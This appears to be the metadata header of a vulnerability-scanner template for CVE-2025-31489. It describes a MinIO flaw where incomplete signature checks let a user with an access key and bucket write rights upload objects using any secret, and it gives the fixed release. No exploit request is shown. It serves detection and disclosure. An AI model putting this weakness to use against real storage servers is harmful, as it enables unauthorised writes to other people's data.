id: CVE-2025-31489

info:
  name: MinIO - Incomplete Signature Validation for Unsigned-Trailer Uploads
  author: iamnoooob,rootxharsh,pdresearch
  severity: high
  description: |
    MinIO is a High Performance Object Storage released under GNU Affero General Public License v3.0. The signature component of the authorization may be invalid, which would mean that as a client you can use any arbitrary secret to upload objects given the user already has prior WRITE permissions on the bucket. Prior knowledge of access-key, and bucket name this user might have access
    to - and an access-key with a WRITE permissions is necessary. However with relevant information in place, uploading random objects to buckets is trivial and easy via curl.
  remediation: This issue is fixed in RELEASE.2025-04-03T14-56-28Z.
